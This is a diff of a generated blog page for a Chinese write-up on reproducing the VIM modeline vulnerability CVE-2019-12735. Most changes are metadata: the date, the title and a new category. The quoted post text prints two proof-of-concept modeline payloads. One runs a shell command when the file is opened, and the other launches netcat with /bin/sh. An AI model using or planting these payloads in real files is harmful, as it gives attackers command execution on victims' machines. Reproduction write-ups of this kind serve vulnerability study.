@@ -292,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/08/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="JOJO">
@@ -311,7 +311,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/06/08/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/" itemprop="url">基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735</a></h1>
         
 
         <div class="post-meta">
@@ -323,8 +323,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-08T11:43:05+08:00">
-                2019-06-08
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-20T15:40:30+08:00">
+                2019-06-20
               </time>
             
 
@@ -333,6 +333,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/客户端安全/" itemprop="url" rel="index">
+                    <span itemprop="name">客户端安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -371,7 +393,7 @@
 </ol>
 <h3 id="复现poc1过程："><a href="#复现poc1过程：" class="headerlink" title="复现poc1过程："></a>复现poc1过程：</h3><ol>
 <li>在～/.vimrc中加入set modeline确保开启该选项</li>
-<li>使用原作者的第一个poc直接写入一个文件并保存：<code>:!uname -a||&quot; vi:fen:fdm=expr:fde=assertfails(&quot;source\!\ \%&quot;):fdl=0:fdt=&quot;</code>3. 然后使用vim打开该文件，如果受影响就会执行打印uname -a的结果，如果不受影响就是一个普通的文本</li>
+<li>使用原作者的第一个poc直接写入一个文件并保存：`:!uname -a||” vi:fen:fdm=expr:fde=assertfails(“source!\ \%”):fdl=0:fdt=”<br> `3. 然后使用vim打开该文件，如果受影响就会执行打印uname -a的结果，如果不受影响就是一个普通的文本</li>
 </ol>
 <h3 id="复现poc2过程："><a href="#复现poc2过程：" class="headerlink" title="复现poc2过程："></a>复现poc2过程：</h3><p>先来看看原作者在git上写着的poc2:<br>\x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\’nohup nc 127.0.0.1 9999 -e /bin/sh &amp;\’) | redraw! | file | silent! # “ vim: set fen fdm=expr fde=assert_fails(\’set\ fde=x\ \|\ source\!\ \%\’) fdl=0: \x16\x1b[1G\x16\x1b[KNothing here.”\x16\x1b[D \n<br>如果你只是检测的话可以不用看这个poc，这个poc主要是用来贴近实战的利用。我估计会有人使用这个poc1成功，但是使用poc2始终不成功，其实这个poc有几个地方需要改一下（准确来说是不能复制黏贴）：</p>
 <ol>
@@ -1542,7 +1564,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -1553,7 +1575,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
